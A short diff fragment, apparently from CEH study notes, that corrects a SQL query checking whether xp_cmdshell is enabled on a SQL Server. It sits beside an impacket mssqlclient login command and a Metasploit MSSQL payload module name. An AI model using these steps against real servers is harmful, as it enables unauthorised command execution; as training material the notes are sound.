@@ -136,7 +136,7 @@ Tool to Exploit Sql server Vulenrability
 
 Python3 /root/impacket/examples/mssqlclient.py SKILL.CEH.com/LoginName:Password@IP -port 1433 
 
-SELECT name, CONVERT(INT. ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell'; 
+SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS Isconfigured FROM sys.configurations WHERE name='xp_cmdshell';
 
 msfconsole  - use exploit/windows/mssql/mssql_payload 
 
